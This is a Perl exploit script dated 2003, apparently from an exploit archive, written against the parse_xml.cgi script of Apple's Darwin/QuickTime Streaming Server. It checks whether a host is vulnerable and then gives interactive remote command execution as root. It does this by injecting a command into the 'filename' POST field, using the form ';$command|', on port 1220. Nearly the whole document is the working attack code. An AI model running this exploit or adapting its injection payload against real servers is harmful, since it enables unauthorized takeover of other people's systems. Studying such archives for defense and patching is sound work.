#!/usr/bin/perl
#
# QTTS REMOTE ROOT  exploit by FOX_MULDER (fox_mulder@abv.bg)
# FOX_MULDER PRESENTS    fox_mulder_at_abv.bg
#
# Darwin(OSX)4.x(?) 5.X QTSS(Quick Time Stream Server) 3.X
#
# The bug in Darwin 5.X with unpatched QTSS in parse_xml.cgi which lead to remote root compromise:
#    $filename = $query->{'filename'};
#    $templatefile = $query->{'template'};
# Based on http://wbyte.ath.cx/~wbyte/researches/qtss-core.txt#
###########################

use IO::Socket;
use LWP::Simple; 
use LWP 5.64;

sub Usage {
print STDERR "\nQTTS REMOTE ROOT EXPLOIT BY FOX_MULDER !!!\n";
print STDERR "Usage:cenex.pl <www.example.com> \n";
exit;
}

if (@ARGV < 1)
{
 Usage();
}


$host = @ARGV[0];
print "\n\n !!!PRIVATE EXPLOIT!!! \n\n";
print "Darwin QTTS Remote Root Exploit by FOX_MULDER\n";

print "\n[+] Conecting to $host\n";
&check($command="id");
&hack($command="uname -a;id");
while ()
 {
    print "Command# ";
    while(<STDIN>)
     {
        $command=$_;
        chomp($command);
        exit() if ($command eq 'exit');
        last;
     }
    &hack($command);
 }

&hack($command);

sub hack{
my $browser = LWP::UserAgent->new;
   $browser->agent('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)');

  my $url = "http://$host:1220/parse_xml.cgi";
  my $response = $browser->post( $url,
    [
        'filename' => ";$command|"
]
  );


  die "Received invalid response type", $response->content_type
   unless $response->content_type eq 'text/html';

        print $response->content;


}



sub check{
print "[+] Checking if vulnerable . . .\n";
my $browser = LWP::UserAgent->new;
   $browser->agent('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)');

  my $url = "http://$host:1220/parse_xml.cgi";
  my $response = $browser->post( $url,
    [
        'filename' => ";$command|"
]
  );

 	my $code = $response->status_line;
	if($code != 200){
	print "Not vulnerable\n";
	exit;
        }
       print "[+] Status $code ...\n";
}

# milw0rm.com [2003-02-24]
